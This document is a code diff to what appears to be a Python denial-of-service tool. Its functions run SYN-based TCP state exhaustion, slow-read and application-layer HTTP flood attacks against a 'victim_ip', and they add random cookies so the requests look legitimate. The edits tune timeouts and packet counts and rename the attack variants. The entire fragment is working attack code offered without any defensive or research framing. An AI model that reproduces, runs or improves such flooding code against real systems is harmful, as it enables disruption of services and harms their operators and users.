@@ -1,3 +1,4 @@
+import os
 import random
 import time
 import threading
@@ -198,7 +199,7 @@ class AdvancedTechniques:
             
             # Send and wait for SYN-ACK
             try:
-                reply = sr1(syn_packet, timeout=1, verbose=0)
+                reply = sr1(syn_packet, timeout=0.1, verbose=0)
                 
                 if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags & 0x12:  # SYN+ACK
                     # Extract server sequence number and acknowledge it
@@ -255,7 +256,7 @@ class AdvancedTechniques:
             
             # Sometimes add cookies to appear more legitimate
             if random.random() > 0.5:
-                http_request += f"Cookie: session_id={random.randbytes(16).hex()}; user_pref=dark_mode\r\n"
+                http_request += f"Cookie: session_id={os.urandom(16).hex()}; user_pref=dark_mode\r\n"
                 
             http_request += "\r\n"
             
@@ -589,18 +590,18 @@ def run_attack(attacker_host, victim_ip, duration, attack_variant="multi_vector"
 
     if attack_variant == "slow_read":
         coordinator.advanced.slow_read_attack(victim_ip, duration=duration)
-    elif attack_variant == "tcp_state_exhaustion":
+    elif attack_variant == "ad_syn":
         # For state exhaustion, we might run it in a loop for the duration
         end_time = time.time() + duration
         while time.time() < end_time:
-            coordinator.advanced.tcp_state_exhaustion(victim_ip, num_packets=100)
+            coordinator.advanced.tcp_state_exhaustion(victim_ip, num_packets=5)
             time.sleep(1) # Small delay
-    elif attack_variant == "application_layer":
+    elif attack_variant == "ad_udp":
         end_time = time.time() + duration
         while time.time() < end_time:
-            coordinator.advanced.distributed_application_layer_attack(victim_ip, num_requests=50)
+            coordinator.advanced.distributed_application_layer_attack(victim_ip, num_requests=10)
             time.sleep(1) # Small delay
-    elif attack_variant == "multi_vector":
+    elif attack_variant == "multivector":
         coordinator.advanced.multi_vector_attack(victim_ip, duration=duration)
     else:
         logger.warning(f"Unknown attack variant: {attack_variant}. Running multi_vector by default.")
